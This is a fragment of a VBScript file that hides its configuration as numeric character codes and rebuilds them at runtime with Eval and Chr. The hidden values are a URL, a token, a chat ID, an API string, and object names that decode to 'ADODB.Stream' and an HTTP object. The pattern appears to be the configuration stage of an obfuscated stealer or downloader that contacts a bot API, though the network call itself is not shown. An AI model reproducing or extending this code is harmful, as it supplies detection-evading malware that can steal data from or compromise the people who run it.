    g11 = 72 : g12 = 84 : g13 = 84 : g14 = 80

    Dim h1, h2, h3, h4, h5, h6, h7, h8, h9, h10
    Dim h11, h12, h13
    h1 = 65 : h2 = 68 : h3 = 79 : h4 = 68 : h5 = 66
    h6 = 46 : h7 = 83 : h8 = 116 : h9 = 114 : h10 = 101
    h11 = 97 : h12 = 109 : h13 = 58

' ===== ASSEMBLE ALL CONFIGURATION =====
Dim idx

g_sURL = ""
For idx = 1 To 100
    If Eval("z" & idx & " > 0") Then g_sURL = g_sURL & Chr(Eval("z" & idx))
Next

g_sToken = ""
For idx = 1 To 100
    If Eval("t" & idx & " > 0") Then g_sToken = g_sToken & Chr(Eval("t" & idx))
Next

g_sChat = ""
For idx = 1 To 100
    If Eval("c" & idx & " > 0") Then g_sChat = g_sChat & Chr(Eval("c" & idx))
Next

g_sAPI = ""
For idx = 1 To 100
    If Eval("a" & idx & " > 0") Then g_sAPI = g_sAPI & Chr(Eval("a" & idx))
Next

g_sSM = ""
For idx = 1 To 12
    If Eval("b" & idx & " > 0") Then g_sSM = g_sSM & Chr(Eval("b" & idx))
Next

g_sSD = ""
For idx = 1 To 13
    If Eval("d" & idx & " > 0") Then g_sSD = g_sSD & Chr(Eval("d" & idx))
Next

g_sGU = ""
For idx = 1 To 11
    If Eval("e" & idx & " > 0") Then g_sGU = g_sGU & Chr(Eval("e" & idx))
Next

g_sUC = ""
For idx = 1 To 7
    If Eval("f" & idx & " > 0") Then g_sUC = g_sUC & Chr(Eval("f" & idx))
Next

g_sObj = ""
For idx = 1 To 14
    If Eval("g" & idx & " > 0") Then g_sObj = g_sObj & Chr(Eval("g" & idx))
Next

g_sStr = ""
For idx = 1 To 13
    If Eval("h" & idx & " > 0") Then g_sStr = g_sStr & Chr(Eval("h" & idx))
Next

    On Error GoTo 0
End Sub

'==========================================================================
' END OF SCRIPT - AUTHOR: MASTER SHADOW LORD
'==========================================================================
WScript.Quit(0)